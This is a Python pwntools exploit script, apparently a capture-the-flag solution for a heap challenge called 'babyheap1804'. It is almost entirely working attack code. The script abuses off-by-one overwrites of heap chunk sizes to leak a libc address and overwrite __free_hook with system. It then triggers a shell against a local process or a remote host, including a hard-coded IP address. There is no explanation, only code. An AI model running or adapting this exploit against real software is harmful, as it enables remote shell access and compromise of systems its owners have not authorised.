#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import os
code = ELF('./babyheap1804')
context.arch = code.arch
context.log_level = 'debug'
gadget = lambda x: next(code.search(asm(x, os='linux', arch=code.arch)))

def add(size):
    r.sendlineafter('Command: ', '1')
    r.sendlineafter(': ', str(size))

def edit(idx, size, content):
    r.sendlineafter('Command: ', '2')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(size))
    r.sendafter(': ', flat(content))

def delete(idx):
    r.sendlineafter('Command: ', '3')
    r.sendlineafter(': ', str(idx))

def show(idx):
    r.sendlineafter('Command: ', '4')
    r.sendlineafter(': ', str(idx))

def exploit(r):
    for i in range(8):
        add(0x18) 
    for i in range(7)[::-1]:
        edit(i, 0x18+1, 'A'*0x18+'\xf1')
        delete(i+1) # use out 0xf0 tcache
    add(0x18) # 1
    add(0x18) # 2
    add(0x58) # 3
    add(0x58) # 4
    add(0x58) # 5
    add(0x18) # 6
    add(0x18) # 7
    edit(1, 0x18+1, 'A'*0x18+'\x31')
    delete(2)
    add(0x28) # 2
    edit(2, 0x18+1, 'A'*0x18+'\xf1')
    edit(5, 0x50, [0, 0, 0, 0, 0xf0, 0x21, 0, 0, 0, 0x21])
    delete(3) # unsorted bin
    show(2)
    r.recvuntil('A'*0x18)
    tmp = u64(r.recv(0x10)[8:])
    libc.address = tmp - libc.sym['__malloc_hook']-0x70
    info('%016x libc.address', libc.address)
    edit(5, 0x58+1, 'A'*0x58+'\x31')
    delete(1)
    delete(6) # 0x30
    delete(7) # 0x20
    add(0x28) # 1
    edit(1, 0x28, [0, 0, 0, 0, libc.sym['__free_hook']])
    add(0x18) # 3
    add(0x18) # 6
    edit(6, 0x8, libc.sym['system'])
    edit(3, 0x8, '/bin/sh\x00')
    delete(3)
    r.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 2:
        r = remote(sys.argv[1], int(sys.argv[2]))
    elif len(sys.argv) > 1:
        os.environ['LD_LIBRARY_PATH'] = './'
        #r = remote('127.0.0.1', 4444)
        r = code.process()
    else:
        #r = remote('127.0.0.1', 4444)
        r = remote('192.168.201.24', 127)
        #r = code.process()
    libc = ELF('./bc.so.6')
    exploit(r)
